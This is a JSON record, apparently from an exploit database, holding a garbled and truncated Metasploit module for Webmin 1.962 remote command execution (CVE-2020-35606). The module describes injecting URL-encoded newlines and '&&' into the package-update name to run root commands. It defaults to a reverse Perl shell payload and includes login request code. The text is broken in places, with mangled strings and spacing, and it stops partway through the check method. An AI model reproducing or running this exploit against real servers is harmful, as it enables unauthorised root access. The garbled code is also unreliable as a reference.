{
    "text": "vul_name : Webmin 1.962 Remote Command Execution ， vul_cve : CVE-2019-12840 , CVE-2020-35606 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'Webmin 1.962 - Package Update Escape Bypass RCE ( Metasploit ) ' ,  ， 'Description' => %q (  ， This module exploits an arbitrary command execution vulnerability in Webmin ， 1.962 and lower versions. Any user authorized to the \"Package Updates\" ， module can execute arbitrary commands with root privileges. ， It emerged by circumventing the measure taken for CVE-2019-12840. ， s/\\ ( - )  | \\ ( . ) /string/g ; escape is not enough for prevention. ， Therefore , since the package name variable is placed directly in the system command ,  ， we can manipulate it using some escape characters that HTTP supports. ， For example , we can escape control by dropping the command line down one line. ， We can do this with \"%0A\" and \"%0C\" urlencoded row values.Also , for paylad to work correctly ,  ， we must add double an ampersand (  ) to the end of the payload ( %26%26 )  ， 'Author' => [  ， 'AkkuS <zkan Mustafa Akku>' # Vulnerability Discovery , MSF PoC module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , 'CVE-2020-35606' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Privileged' => true ,  ， 'Payload' => ， { ， 'DisableNops' => true ,  ， 'Space' => 512 ,  ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ， } ， } ,  ， 'DefaultOptions' => ， { ， 'RPORT' => 10000 ,  ， 'SSL' => false ,  ， 'PAYLOAD' => 'cmd/unix/reverse_perl' ， } ,  ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [ 'Webmin <= 1.962' , {} ]  ,  ， 'DisclosureDate' => '2020-12-21' ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptString.new ( 'USERNAME' ,  [ true , 'Webmin Username' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Webmin Password' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path for Webmin application' , '/' ]  )  ，  ]  ， end ， def peer ， \" # {ssl ? ' : ' } # {rhost} :  # {rport}\" ， end ， def login ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => normalize_uri ( target_uri , 'session_login.cgi' )  ,  ， 'cookie' => 'testing=1' ,  # it must be used for \"Error - No cookies\" ， 'vars_post' => { ， 'page' => ' ,  ， 'user' => datastore [ 'USERNAME' ]  ,  ， 'pass' => datastore [ 'PASSWORD' ]  ， } ， } )  ， end ， ' ， end ， def check ， cookie = login",
    "time": "2020.12.23"
}